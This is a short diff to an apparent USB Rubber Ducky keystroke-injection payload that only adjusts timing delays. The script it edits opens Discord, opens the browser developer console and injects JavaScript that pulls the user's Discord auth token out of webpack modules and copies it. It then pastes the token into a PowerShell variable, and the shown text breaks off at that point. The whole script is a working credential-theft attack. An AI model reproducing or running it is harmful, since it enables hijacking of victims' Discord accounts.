@@ -1,16 +1,20 @@
-DEFAULT_DELAY 200
+DEFAULT_DELAY 10
 GUI r
 STRING powershell
+DELAY 50
 ENTER
 STRING Start-Process "https://discord.com/channels/@me"
+DELAY 200
 ENTER
 CTRL SHIFT j
 CTRL ~
 STRING webpackChunkdiscord_app.push([[Math.random()],{},e=>{for(const c of Object.keys(e.c)){try{const m=e.c[c].exports;if(m&&m.default&&m.default.getToken!==undefined){const token=m.default.getToken();if(token.includes(".")){console.log(`${token}`);copy(token);}}}catch{}}}]);
 ENTER
+DELAY 5
 CTRL w
 GUI r
 STRING powershell
+DELAY 50
 ENTER
 STRING $token = "
 CTRL v
